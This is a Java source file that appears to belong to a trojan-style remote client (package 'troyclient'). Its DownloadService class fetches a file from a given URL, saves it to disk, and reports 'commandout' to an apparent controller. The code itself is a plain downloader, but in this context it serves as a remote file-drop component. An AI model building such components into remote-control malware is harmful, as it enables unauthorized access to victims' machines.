package ch.lebois.troyclient.service;

import ch.lebois.troyclient.main.SystemVariables;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

/**
 * @PROJECT Hermann
 */

public class DownloadService {

    public void download(String url, String fileName) {
        URL website;
        try {
            website = new URL(url);
            ReadableByteChannel rbc = Channels.newChannel(website.openStream());
            FileOutputStream fos = new FileOutputStream(fileName);
            fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
            rbc.close();
            fos.close();
            SystemVariables.SENDER.send("commandout", "Downloaded File " + fileName);
        } catch (FileNotFoundException e) {
            System.err.println("Could not save file: " + fileName + " from " + url);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
